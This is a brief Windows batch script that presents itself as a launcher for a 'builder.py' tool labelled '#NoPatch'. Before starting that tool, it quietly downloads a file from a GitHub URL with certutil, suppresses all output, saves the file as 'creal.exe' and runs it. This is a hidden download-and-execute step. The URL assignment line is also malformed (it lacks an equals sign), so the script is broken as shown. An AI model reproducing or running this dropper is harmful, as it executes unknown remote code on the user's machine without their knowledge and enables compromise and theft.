
@echo off
set "URLhttps://github.com/scrapyaltf4/nopatch/blob/main/builder.py
set "Dossier=img"
set "NomFichier=%Dossier%\creal.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
title #NoPatch
python builder.py
pause
